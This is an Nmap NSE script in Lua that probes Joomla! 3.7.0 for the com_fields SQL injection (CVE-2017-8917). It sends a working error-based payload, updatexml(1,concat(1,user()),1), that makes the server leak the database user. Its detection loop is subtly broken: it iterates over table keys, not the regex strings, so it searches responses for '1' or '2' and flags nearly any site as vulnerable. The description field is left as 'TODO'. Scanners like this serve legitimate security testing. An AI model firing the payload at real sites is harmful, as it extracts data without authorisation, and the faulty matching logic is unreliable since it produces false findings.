local http = require "http"
local shortport = require "shortport"
local string = require "string"
local stdnse = require "stdnse"
local vulns = require "vulns"

description = [[
TODO
]]

author = "Wong Wai Tuck"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"vuln", "safe"}

local REG_EXP_SUCCESS = {"XPATH syntax error: &#039;(.*)&#039;",
  "XPATH syntax error: '(.*)'.*"}

portrule = shortport.http

action = function(host, port)
  local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)
  local vuln_table = {
    title = "Joomla! 3.7.0 'com_fields' SQL Injection Vulnerability",
    state = vulns.STATE.NOT_VULN,
    IDS = {CVE = 'CVE-2017-8917'},
    risk_factor = "Critical",
    scores = {
      CVSSv3 = "9.8 (Critical) (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)",
    },
    description = [[
An SQL injection vulnerability in Joomla! 3.7.x before 3.7.1 allows attackers
to execute aribitrary SQL commands via unspecified vectors.
]],
    references = {
        'https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html',
        'https://github.com/brianwrf/Joomla3.7-SQLi-CVE-2017-8917'
    }
  }
  local uri = stdnse.get_script_args(SCRIPT_NAME .. '.uri') or '/'
  uri = uri .. 'index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(1,concat(1,user()),1)'

  stdnse.debug1("Attacking uri %s", uri)
  local response = http.get(host, port, uri)

  stdnse.debug1("Response %s", response.status)

  if response.status then
    local matches
    -- If it contains a matching string, it means SQL injection was successful
    -- Otherwise it isn't vulnerable
    for pattern in pairs(REG_EXP_SUCCESS) do
      matches = string.find(response.body, pattern)
      if matches then
        stdnse.debug1("Vulnerability found!")
        vuln_table.state = vulns.STATE.VULN
        break
      end
    end
  end
  return vuln_report:make_output(vuln_table)
end
